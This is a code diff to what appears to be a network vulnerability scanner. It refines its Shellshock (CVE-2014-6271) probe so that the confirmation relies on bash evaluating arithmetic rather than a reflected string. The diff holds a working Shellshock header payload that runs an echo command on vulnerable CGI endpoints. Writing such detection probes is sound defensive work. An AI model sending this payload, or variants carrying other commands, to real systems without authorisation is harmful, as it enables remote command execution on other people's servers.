@@ -287,6 +287,16 @@ def probe_grafana_path_traversal(host: str, port: int, scheme: str = "http",
     return None
 
 
+# Confirmation token is the *evaluated* result of bash arithmetic in the
+# injected payload, not the payload string itself. Apache printenv and any
+# CGI that reflects User-Agent/Referer/Cookie would otherwise confirm
+# CVE-2014-6271 CRITICAL (fusion-pinned) without executing bash.
+_SHELLSHOCK_FACTORS = (7, 191, 13)  # product = 17381
+_SHELLSHOCK_TOKEN = (
+    f"NETLOGIC_{_SHELLSHOCK_FACTORS[0] * _SHELLSHOCK_FACTORS[1] * _SHELLSHOCK_FACTORS[2]}"
+)
+
+
 def probe_shellshock(host: str, port: int, scheme: str = "http",
                      timeout: float = 5.0) -> Optional[CVEProbe]:
     """CVE-2014-6271 — Shellshock: bash CGI remote code execution via environment injection."""
@@ -295,7 +305,8 @@ def probe_shellshock(host: str, port: int, scheme: str = "http",
         "/cgi-bin/status", "/cgi-bin/env", "/cgi-bin/index.cgi",
         "/cgi-bin/bash", "/cgi-bin/run.cgi",
     ]
-    payload = "() { :;}; echo; echo; echo NETLOGIC_SHELLSHOCK_CONFIRMED"
+    a, b, c = _SHELLSHOCK_FACTORS
+    payload = f"() {{ :;}}; echo; echo; echo NETLOGIC_$(({a}*{b}*{c}))"
     for path in cgi_paths:
         req = (
             f"GET {path} HTTP/1.1\r\n"
@@ -306,7 +317,7 @@ def probe_shellshock(host: str, port: int, scheme: str = "http",
             f"Connection: close\r\n\r\n"
         ).encode()
         resp = _raw_http(host, port, req, timeout=timeout)
-        if resp and "NETLOGIC_SHELLSHOCK_CONFIRMED" in resp:
+        if resp and _SHELLSHOCK_TOKEN in resp:
             return CVEProbe(
                 cve_id="CVE-2014-6271",
                 title="Shellshock — Bash CGI Remote Code Execution",
@@ -314,7 +325,8 @@ def probe_shellshock(host: str, port: int, scheme: str = "http",
                 detail=(f"Shellshock confirmed at {path}. "
                         "Bash function definition in HTTP headers executes arbitrary commands. "
                         "Full unauthenticated OS command execution as the web server user."),
-                evidence=f"GET {path} with Shellshock payload in User-Agent → 'NETLOGIC_SHELLSHOCK_CONFIRMED' in response",
+                evidence=(f"GET {path} with Shellshock payload in User-Agent → "
+                          f"'{_SHELLSHOCK_TOKEN}' in response"),
                 remediation="Update bash to a patched version (>= 4.3-patch 25); disable CGI scripts; upgrade OS."
             )
     return None
